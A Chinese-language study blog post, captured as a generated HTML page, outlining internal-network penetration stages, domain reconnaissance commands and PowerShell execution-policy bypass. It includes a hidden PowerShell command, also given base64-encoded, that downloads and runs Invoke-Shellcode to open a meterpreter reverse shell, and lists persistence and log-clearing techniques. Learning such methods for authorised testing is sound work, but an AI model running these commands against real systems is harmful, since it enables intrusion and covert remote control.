@@ -1,0 +1,890 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('Enter password') !== ''){
+                alert('Error！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="内网渗透,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="内网渗透测试流程获取shell VPN 获取shell 端口转发  进入内网     常用文件类型exe\ps1\python   网络位置判断 网络区域 主机角色 连通性判断  信息收集组信息收集、域信息收集、管理员信息收集、非管理员信息收集。。。      收集范围：权限信息、机器信息、进程端口、网络连接、共享、会话、敏感文件、密码文件、配置文件、浏览器记录、远程连接工具(Xshell)之类的">
+<meta name="keywords" content="内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透学习之基础概念">
+<meta property="og:url" content="http://yoursite.com/2019/10/24/内网渗透学习之基础概念/index.html">
+<meta property="og:site_name" content="故人梦">
+<meta property="og:description" content="内网渗透测试流程获取shell VPN 获取shell 端口转发  进入内网     常用文件类型exe\ps1\python   网络位置判断 网络区域 主机角色 连通性判断  信息收集组信息收集、域信息收集、管理员信息收集、非管理员信息收集。。。      收集范围：权限信息、机器信息、进程端口、网络连接、共享、会话、敏感文件、密码文件、配置文件、浏览器记录、远程连接工具(Xshell)之类的">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://k-ring.github.io/img/pow1.jpg">
+<meta property="og:updated_time" content="2020-06-07T03:50:39.069Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="内网渗透学习之基础概念">
+<meta name="twitter:description" content="内网渗透测试流程获取shell VPN 获取shell 端口转发  进入内网     常用文件类型exe\ps1\python   网络位置判断 网络区域 主机角色 连通性判断  信息收集组信息收集、域信息收集、管理员信息收集、非管理员信息收集。。。      收集范围：权限信息、机器信息、进程端口、网络连接、共享、会话、敏感文件、密码文件、配置文件、浏览器记录、远程连接工具(Xshell)之类的">
+<meta name="twitter:image" content="https://k-ring.github.io/img/pow1.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/10/24/内网渗透学习之基础概念/">
+
+
+
+
+
+  <title>内网渗透学习之基础概念 | 故人梦</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">故人梦</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">至今朝，忆往昔、</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-resources">
+          <a href="/resources/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-modx"></i> <br>
+            
+            资源
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-link">
+          <a href="/link/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br>
+            
+            友链
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/10/24/内网渗透学习之基础概念/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="故人梦">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="故人梦">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">内网渗透学习之基础概念</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-24T00:00:00+08:00">
+                2019-10-24
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/内网渗透/" itemprop="url" rel="index">
+                    <span itemprop="name">内网渗透</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1,261 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  5 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="内网渗透测试流程"><a href="#内网渗透测试流程" class="headerlink" title="内网渗透测试流程"></a>内网渗透测试流程</h3><h4 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h4><ul>
+<li>VPN</li>
+<li>获取shell</li>
+<li>端口转发 </li>
+<li>进入内网   </li>
+</ul>
+<p>常用文件类型<code>exe\ps1\python</code>  </p>
+<h4 id="网络位置判断"><a href="#网络位置判断" class="headerlink" title="网络位置判断"></a>网络位置判断</h4><ul>
+<li>网络区域</li>
+<li>主机角色</li>
+<li>连通性判断</li>
+</ul>
+<h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>组信息收集、域信息收集、管理员信息收集、非管理员信息收集。。。     </p>
+<p>收集范围：权限信息、机器信息、进程端口、网络连接、共享、会话、敏感文件、密码文件、配置文件、浏览器记录、远程连接工具(Xshell)之类的记录等    </p>
+<h5 id="nbtscan-exe"><a href="#nbtscan-exe" class="headerlink" title="nbtscan.exe"></a>nbtscan.exe</h5><p>nbtscan可以用来扫描整个局域网，可以得到存活主机的ip地址、主机名、mac地址等（主要用途是可以用来查找ARP欺骗中的木马主机）<br>nbtscan.exe实现的原理：<br><a href="https://blog.csdn.net/xizhibei/article/details/7910308" target="_blank" rel="noopener">nbtscan局域网扫描的原理</a>    </p>
+<h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><ul>
+<li>利用EXP溢出提权，windows-kernel-exploits</li>
+<li>Bypass UAC提权</li>
+<li>windows利用服务提权：未加引号的服务路径、权限配置不当的服务</li>
+<li>利用AD特性提权：MS14-068、GPP等</li>
+<li>假冒令牌：用户注销后（没有重启），系统会将主令牌切换为模拟令牌，不会将令牌清除   </li>
+</ul>
+<h4 id="内网横向渗透方法"><a href="#内网横向渗透方法" class="headerlink" title="内网横向渗透方法"></a>内网横向渗透方法</h4><ul>
+<li>ipc$+计划任务</li>
+<li>PTH</li>
+<li>WMI</li>
+<li>WinRm</li>
+<li>利用常规的web渗透横向</li>
+<li>sc</li>
+<li>ps1</li>
+</ul>
+<p>在无法抓取用户明文密码的时候(比如windows10)可以使用hash注入登录系统  </p>
+<h4 id="内网渗透权限持久化"><a href="#内网渗透权限持久化" class="headerlink" title="内网渗透权限持久化"></a>内网渗透权限持久化</h4><p>1、利用活动目录  </p>
+<ul>
+<li>Golden Ticket</li>
+<li>Silver Ticket</li>
+<li>DSRM</li>
+<li>SSP(Security Support Provider)</li>
+<li>Hook PasswordChangeNotify</li>
+<li>SID History</li>
+</ul>
+<p>2、Windows常规持久化  </p>
+<ul>
+<li>常规webshell</li>
+<li>利用windows注册表项</li>
+<li>Logon Scripts</li>
+<li>Dll劫持</li>
+<li>计划任务(at、schtasks)</li>
+<li>wmi事件</li>
+<li>COM劫持</li>
+</ul>
+<h4 id="MITI"><a href="#MITI" class="headerlink" title="MITI"></a>MITI</h4><h4 id="日志清理"><a href="#日志清理" class="headerlink" title="日志清理"></a>日志清理</h4><ul>
+<li>Windows EventLog</li>
+<li>Application Log</li>
+<li>Session</li>
+<li>进程</li>
+<li>物理存储中的二进制文件    </li>
+</ul>
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>通常发现一个内网存在域之后，我们需要收集有关内网相关的信息，确定内网主机的分布结构，确定该主机的角色，安装的什么类型的杀软之类的    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all                            # 这条命令可以判断该主机是在工作组还是在域环境中，得到ip地址和子网掩码，DNS服务器的IP地址  </span><br><span class="line"></span><br><span class="line">net view                                 # 查看跟本机有关联的主机</span><br><span class="line"></span><br><span class="line">net view /domain                         # 查看在当前的网络环境存在几个域</span><br><span class="line"></span><br><span class="line">net view /domain:xxx                     # 查看在xxx域中跟本机有关联的主机</span><br><span class="line"></span><br><span class="line">net user /domain                         # 查看域内有所有用户名</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; /domain     # 查看域内所有机器名</span><br><span class="line"></span><br><span class="line">net group &quot;domain controllers&quot; /domain   # 查看域内的域控</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain        # 查看域内的管理员</span><br><span class="line"></span><br><span class="line">net time /domain                         # 查看域时间及服务器名字</span><br><span class="line"></span><br><span class="line">nslookup -type=srv _ldap._tcp.           # 查询DNS</span><br><span class="line"></span><br><span class="line">netstat -ano                             # 查看网络连接情况</span><br></pre></td></tr></table></figure>
+<p>通过上面的命令，我们可以得到：   </p>
+<ul>
+<li>该主机名和所在的IP网段</li>
+<li>DNS服务器IP地址</li>
+<li>域的数量</li>
+<li>当前域下的所有机器名</li>
+<li>域内的所有用户名</li>
+<li>域控和域管理员</li>
+</ul>
+<p>后续还可进行的一些操作(都是收集，待补充)：   </p>
+<ul>
+<li>根据主机名的命名规则生成字典</li>
+<li>根据子网掩码计算IP段范围，利用脚本扫描存货主机</li>
+</ul>
+<p>最终目的是拿下域控，并获得可持续性权限。    </p>
+<h3 id="PS常用命令"><a href="#PS常用命令" class="headerlink" title="PS常用命令"></a>PS常用命令</h3><p>通常powershell有一个执行策略，默认情况下，设置为受限，也就是不能运行ps脚本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">get-executionpolicy                  查看当前的执行策略</span><br><span class="line"></span><br><span class="line">有以下几种策略：  </span><br><span class="line">restricted       脚本不能运行(默认设置)</span><br><span class="line">remotesigned     本地创建的脚本可以运行，但是从网上下载的脚本不能运行(拥有数字签名的除外)  </span><br><span class="line">allsigned        仅当脚本由受信任的发布者签名时才能运行 </span><br><span class="line">unrestricted     允许所有的脚本运行</span><br><span class="line"></span><br><span class="line">set-executionpolicy &lt;policy-name&gt;    设置(更改)策略</span><br><span class="line">set-executionpolicy unrestricted     允许所有的脚本运行</span><br></pre></td></tr></table></figure></p>
+<p>powershell在默认情况下不能直接执行，可以使用上述方法绕过<br>1、使用-executionpolicy bypass染过权限<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -executionpolicy bypass -file 1.ps1</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://k-ring.github.io/img/pow1.jpg" alt>     </p>
+<p>1.ps1里的内容是<code>echo 123 &gt; test.txt</code>。   </p>
+<p>2、从网站服务器上下载PS1脚本，绕过本地权限隐藏执行(暂未反弹shell)<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX(<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'</span>);Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost <span class="number">192.168</span>.<span class="number">100.109</span> -Lport <span class="number">4444</span></span><br></pre></td></tr></table></figure></p>
+<p>使用base64将执行代码加密：<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2 ps_encoder.py -s a.txt</span></span><br><span class="line"></span><br><span class="line">powershell.exe -NoP -NonI -W Hidden -Exec SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQBTAGgAZQBsAGwAYwBvAGQAZQAuAHAAcwAxACcAKQA7AEkAbgB2AG8AawBlAC0AUwBoAGUAbABsAGMAbwBkAGUAIAAtAFAAYQB5AGwAbwBhAGQAIAB3AGkAbgBkAG8AdwBzAC8AbQBlAHQAZQByAHAAcgBlAHQAZQByAC8AcgBlAHYAZQByAHMAZQBfAGgAdAB0AHAAcwAgAC0ATABoAG8AcwB0ACAAMQA5ADIALgAxADYAOAAuADEAMAAwAC4AMQAwADkAIAAtAEwAcABvAHIAdAAgADQANAA0ADQA</span><br></pre></td></tr></table></figure></p>
+<p>运行 32 位 PowerShell 脚本:<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure></p>
+<p>运行 64 位 PowerShell 脚本:<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%WinDir%\syswow64\windowspowershell\v1.<span class="number">0</span>\powershell.exe -NoP -NonI -W Hidden -Exec Bypass</span><br></pre></td></tr></table></figure></p>
+<p>其中一些参数作用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-WindowStyle Hidden(-W Hidden)：隐藏窗口。</span><br><span class="line">-Nonlnteractive（-NonI）：非交互模式。PowerShell 不为用户提供交互的提示。</span><br><span class="line">-NoProfile（-NoP）：PowerShell 控制台不加载当前用户的配置文件。</span><br><span class="line">-noexit：执行后不退出 Shell。这在使用键盘记录等脚本时非常重要。</span><br><span class="line">-NoLogo：启动不显示版权标志的 PowerShell。</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/内网渗透/" rel="tag"># 内网渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/09/端口转发和socks代理工具学习/" rel="next" title="端口转发和socks代理工具学习">
+                <i class="fa fa-chevron-left"></i> 端口转发和socks代理工具学习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/27/内网渗透学习之域环境搭建/" rel="prev" title="内网渗透学习之域环境搭建">
+                内网渗透学习之域环境搭建 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">故人梦</p>
+              <p class="site-description motion-element" itemprop="description">人的一生应该这样度过:不因虚度年华而悔恨，也不因碌碌无为而羞愧</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#内网渗透测试流程"><span class="nav-number">1.</span> <span class="nav-text">内网渗透测试流程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#获取shell"><span class="nav-number">1.1.</span> <span class="nav-text">获取shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#网络位置判断"><span class="nav-number">1.2.</span> <span class="nav-text">网络位置判断</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#信息收集"><span class="nav-number">1.3.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#nbtscan-exe"><span class="nav-number">1.3.1.</span> <span class="nav-text">nbtscan.exe</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#权限提升"><span class="nav-number">1.4.</span> <span class="nav-text">权限提升</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内网横向渗透方法"><span class="nav-number">1.5.</span> <span class="nav-text">内网横向渗透方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#内网渗透权限持久化"><span class="nav-number">1.6.</span> <span class="nav-text">内网渗透权限持久化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MITI"><span class="nav-number">1.7.</span> <span class="nav-text">MITI</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#日志清理"><span class="nav-number">1.8.</span> <span class="nav-text">日志清理</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集-1"><span class="nav-number">2.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PS常用命令"><span class="nav-number">3.</span> <span class="nav-text">PS常用命令</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">故人梦</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">63.3k</span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
